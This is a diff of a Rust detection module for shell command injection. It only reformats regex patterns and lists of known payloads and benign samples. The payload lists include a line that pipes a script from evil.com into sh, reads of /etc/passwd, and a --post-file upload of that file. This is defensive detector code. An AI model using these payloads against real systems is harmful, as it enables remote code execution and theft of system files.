@@ -4,12 +4,22 @@ use std::sync::LazyLock;
 use crate::classes::{ClassDefinition, decode};
 use crate::types::InvariantClass;
 
-static CMD_SEP: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[;&|`\n\r]\s*(?:cat|ls|id|whoami|pwd|uname|curl|wget|nc|ncat|bash|sh|zsh|python[23]?|perl|ruby|php|powershell|cmd|certutil|bitsadmin|net\s+user|reg\s+query|wmic)\b").unwrap());
-static PROSE_BACKTICK: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\w{2,}\s+`[^`]+`\s+\w{2,}").unwrap());
-static DOLLAR_SUB: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\$\([^)]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh|python|perl|ruby|php|nc|ncat)[^)]*\)").unwrap());
-static BACKTICK_SUB: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"`[^`]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh)[^`]*`").unwrap());
-static ARG_1: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:^|\s)--(?:output|exec|post-file|upload-file|config|shell)\b").unwrap());
-static ARG_2: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:^|\s)-[oe]\s+(?:/|http)").unwrap());
+static CMD_SEP: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"[;&|`\n\r]\s*(?:cat|ls|id|whoami|pwd|uname|curl|wget|nc|ncat|bash|sh|zsh|python[23]?|perl|ruby|php|powershell|cmd|certutil|bitsadmin|net\s+user|reg\s+query|wmic)\b").unwrap()
+});
+static PROSE_BACKTICK: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\w{2,}\s+`[^`]+`\s+\w{2,}").unwrap());
+static DOLLAR_SUB: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"\$\([^)]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh|python|perl|ruby|php|nc|ncat)[^)]*\)").unwrap()
+});
+static BACKTICK_SUB: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"`[^`]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh)[^`]*`").unwrap()
+});
+static ARG_1: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?:^|\s)--(?:output|exec|post-file|upload-file|config|shell)\b").unwrap()
+});
+static ARG_2: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?:^|\s)-[oe]\s+(?:/|http)").unwrap());
 
 fn cmd_separator(input: &str) -> bool {
     let d = decode(input);
@@ -39,8 +49,21 @@ pub const CMD_CLASSES: &[ClassDefinition] = &[
         id: InvariantClass::CmdSeparator,
         description: "Shell command separators to chain arbitrary command execution",
         detect: cmd_separator,
-        known_payloads: &["; id", "| cat /etc/passwd", "&& whoami", "|| uname -a", "`id`", "; curl evil.com/shell.sh|sh"],
-        known_benign: &["hello world", "search for items", "price & value", "cats and dogs", "true || false in logic"],
+        known_payloads: &[
+            "; id",
+            "| cat /etc/passwd",
+            "&& whoami",
+            "|| uname -a",
+            "`id`",
+            "; curl evil.com/shell.sh|sh",
+        ],
+        known_benign: &[
+            "hello world",
+            "search for items",
+            "price & value",
+            "cats and dogs",
+            "true || false in logic",
+        ],
         mitre: &["T1059.004"],
         cwe: Some("CWE-78"),
         formal_property: None,
@@ -50,8 +73,18 @@ pub const CMD_CLASSES: &[ClassDefinition] = &[
         id: InvariantClass::CmdSubstitution,
         description: "Command substitution syntax to embed command output in another context",
         detect: cmd_substitution,
-        known_payloads: &["$(id)", "$(cat /etc/passwd)", "`whoami`", "`curl evil.com/shell.sh`"],
-        known_benign: &["$HOME directory", "cost is $(price)", "backtick `code` here", "$(document).ready()"],
+        known_payloads: &[
+            "$(id)",
+            "$(cat /etc/passwd)",
+            "`whoami`",
+            "`curl evil.com/shell.sh`",
+        ],
+        known_benign: &[
+            "$HOME directory",
+            "cost is $(price)",
+            "backtick `code` here",
+            "$(document).ready()",
+        ],
         mitre: &["T1059.004"],
         cwe: Some("CWE-78"),
         formal_property: None,
@@ -61,8 +94,19 @@ pub const CMD_CLASSES: &[ClassDefinition] = &[
         id: InvariantClass::CmdArgumentInjection,
         description: "Inject arguments or flags into commands that accept user-controlled values",
         detect: cmd_argument_injection,
-        known_payloads: &["--output=/tmp/pwned", "-o /tmp/shell.php", "--exec=bash", "--post-file=/etc/passwd"],
-        known_benign: &["--help", "-v", "--version", "my-file-name.txt", "normal argument"],
+        known_payloads: &[
+            "--output=/tmp/pwned",
+            "-o /tmp/shell.php",
+            "--exec=bash",
+            "--post-file=/etc/passwd",
+        ],
+        known_benign: &[
+            "--help",
+            "-v",
+            "--version",
+            "my-file-name.txt",
+            "normal argument",
+        ],
         mitre: &["T1059.004"],
         cwe: Some("CWE-88"),
         formal_property: None,
